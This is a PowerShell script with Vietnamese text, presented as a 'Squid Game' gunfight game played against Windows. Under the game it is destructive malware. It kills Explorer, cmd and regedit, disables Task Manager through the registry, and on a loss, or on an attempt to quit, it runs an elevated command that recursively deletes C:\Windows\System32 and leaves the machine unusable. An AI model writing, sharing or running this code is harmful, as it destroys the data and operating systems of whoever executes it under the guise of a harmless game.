Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
public class MsgBox {
    public static void Show(string text, string caption) {
        MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
}
"@ -Language CSharp

# Hiển thị cảnh báo
[MsgBox]::Show("Chào mừng đến với Squid Game: Đấu Súng BO3!`n`n- Nhập 'reload' để nạp đạn.`n- Nhập 'shoot' để bắn! (Trúng nếu đối thủ đang reload, nhưng thua nếu họ shield).`n- Nhập 'shield' để chặn đạn.`n- Nhập 'bomb' (cần 5 đạn) để thắng ngay lập tức.`n- Bắn khi không có đạn = Thua ngay lập tức.`n- Windows có thời gian suy nghĩ từ 1.5 đến 10 giây trước khi chọn.`n- Thắng 2/3 trận để sống!`n`nChúc may mắn!", "CẢNH BÁO!")

# Khóa các lối thoát
Write-Host "Khóa các lối thoát..."
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cmd" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "regedit" -Force -ErrorAction SilentlyContinue

# Chặn mở Task Manager
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWORD -Force | Out-Null

# Chặn tắt script: Nếu bị tắt, System32 RIP
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Disposed -Action {
    Write-Host "Bạn đã cố thoát! Xóa System32 ngay lập tức..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
} | Out-Null

# Biến lưu số trận thắng/thua
$winCount = 0
$loseCount = 0

# Hàm nhập lựa chọn (15 giây)
function Get-PlayerAction {
    param ($bullets)
    $timeout = 15
    $startTime = Get-Date
    $action = $null

    while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt $timeout) {
        if ($Host.UI.RawUI.KeyAvailable) {
            $action = Read-Host "Nhập hành động của bạn (reload/shoot/shield/bomb) [Đạn: $bullets]"
            break
        }
        Start-Sleep -Milliseconds 500
    }

    # Nếu không nhập kịp
    if (-not $action) {
        Write-Host "Bạn đã chậm tay! Trận này tính là thua!"
        return $null
    }

    return $action.ToLower()
}

# Chơi 3 trận (BO3)
for ($round=1; $round -le 3; $round++) {
    Write-Host "`n--- Trận $round/3 ---"
    
    # Đạn của mỗi bên
    $playerBullets = 0
    $windowsBullets = 0
    $turn = 1

    while ($true) {
        Write-Host "`nBạn có: $playerBullets viên đạn | Windows có: $windowsBullets viên đạn"

        # Người chơi nhập lựa chọn
        $playerAction = Get-PlayerAction $playerBullets
        if ($playerAction -eq $null) {
            $loseCount++
            break
        }

        # Windows suy nghĩ từ 1.5 - 10 giây
        $thinkTime = Get-Random -Minimum 1.5 -Maximum 10
        Write-Host "Windows đang suy nghĩ... ($([math]::Round($thinkTime, 1)) giây)"
        Start-Sleep -Seconds $thinkTime

        # Windows chọn hành động
        if ($turn -eq 1) {
            $windowsAction = "reload"  # Lượt đầu tiên luôn reload
        } elseif ($windowsBullets -ge 5) {
            $windowsAction = "bomb"
        } elseif ($windowsBullets -ge 1 -and (Get-Random -Minimum 0 -Maximum 2) -eq 1) {
            $windowsAction = "shoot"
        } elseif ((Get-Random -Minimum 0 -Maximum 2) -eq 1) {
            $windowsAction = "shield"
        } else {
            $windowsAction = "reload"
        }

        Write-Host "Windows chọn: $windowsAction"

        # Xử lý kết quả
        if ($playerAction -eq "reload") {
            $playerBullets++
        }
        if ($windowsAction -eq "reload") {
            $windowsBullets++
        }

        if ($playerAction -eq "shoot") {
            if ($playerBullets -le 0) {
                Write-Host "💀 Bạn bắn mà không có đạn! Bạn thua trận này!"
                $loseCount++
                break
            }
            $playerBullets--
            if ($windowsAction -eq "reload") {
                Write-Host "🔥 Bạn bắn trúng Windows! Bạn thắng trận này!"
                $winCount++
                break
            }
            if ($windowsAction -eq "shield") {
                Write-Host "🛡️ Windows đã chặn đạn! Trận đấu tiếp tục..."
            }
        }

        if ($windowsAction -eq "shoot") {
            if ($windowsBullets -le 0) {
                Write-Host "😂 Windows bắn mà không có đạn! Bạn thắng trận này!"
                $winCount++
                break
            }
            $windowsBullets--
            if ($playerAction -eq "reload") {
                Write-Host "💀 Windows bắn trúng bạn! Bạn thua trận này!"
                $loseCount++
                break
            }
            if ($playerAction -eq "shield") {
                Write-Host "🛡️ Bạn đã chặn đạn của Windows! Trận đấu tiếp tục..."
            }
        }

        if ($playerAction -eq "bomb" -and $playerBullets -ge 5) {
            Write-Host "💣 Bạn đã kích hoạt bomb! Bạn thắng trận này ngay lập tức!"
            $winCount++
            break
        }

        if ($windowsAction -eq "bomb" -and $windowsBullets -ge 5) {
            Write-Host "💣 Windows đã kích hoạt bomb! Bạn thua trận này ngay lập tức!"
            $loseCount++
            break
        }

        $turn++
    }

    # Kiểm tra nếu đã thắng/thua 2 trận để kết thúc sớm
    if ($winCount -ge 2) {
        Write-Host "`n🔥 Bạn đã thắng 2 trận! System32 an toàn!"
        break
    }
    if ($loseCount -ge 2) {
        Write-Host "`n💀 Bạn đã thua 2 trận! System32 RIP!"
        break
    }
}

# Kiểm tra kết quả cuối cùng
if ($winCount -ge 2) {
    Write-Host "`n🎉 Chúc mừng! Bạn đã thắng ít nhất 2 trận! System32 vẫn an toàn!"
} else {
    Write-Host "`nBạn đã thua. Như bạn đã đọc, System32 sẽ bị xóa."
    Write-Host "Nhưng tôi cũng không phải người xấu, nên tôi sẽ cho bạn thêm 2 phút sử dụng trước khi máy tính này hoàn toàn vô dụng. Chúc may mắn."
    
    Start-Sleep -Seconds 120

    Write-Host "`nHết thời gian. Xóa System32 ngay bây giờ..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
}

Start-Process explorer.exe
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
